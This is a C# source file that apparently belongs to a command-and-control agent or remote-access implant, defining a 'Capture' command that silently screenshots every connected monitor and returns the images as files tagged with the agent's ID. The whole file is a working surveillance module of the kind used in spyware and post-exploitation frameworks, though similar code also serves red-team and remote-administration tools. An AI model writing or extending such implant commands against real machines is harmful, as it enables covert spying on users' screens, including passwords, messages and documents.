using Agent;
using Agent.Commands;
using Agent.Models;
using Shared;
using System;
using System.Collections.Generic;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace Commands
{
    public class CaptureCommand : AgentCommand
    {
        public override CommandId Command => CommandId.Capture;

        public override async Task InnerExecute(AgentTask task, AgentCommandContext context, CancellationToken token)
        {
            List<DownloadFile> files = new List<DownloadFile>();
            int screenId = 1;
            foreach (var screen in Screen.AllScreens)
            {
                Rectangle rc = screen.Bounds;
                var image = new Bitmap(rc.Width, rc.Height, System.Drawing.Imaging.PixelFormat.Format32bppArgb);
                using (Graphics memGraph = Graphics.FromImage(image))
                {
                    memGraph.CopyFromScreen(rc.X, rc.Y, 0, 0, rc.Size, CopyPixelOperation.SourceCopy);
                }

                ImageConverter converter = new ImageConverter();
                var buff = (byte[])converter.ConvertTo(image, typeof(byte[]));

                var filename = $"Capture_{screenId}_{ShortGuid.NewGuid()}.png";

                var file = new DownloadFile()
                {
                    Id = ShortGuid.NewGuid(),
                    FileName = filename,
                    Path = filename,
                    Data = buff,
                    Source = context.Agent.MetaData.Id,
                };

                files.Add(file);
                screenId++;
            }

            context.Objects(files);
        }
    }
}
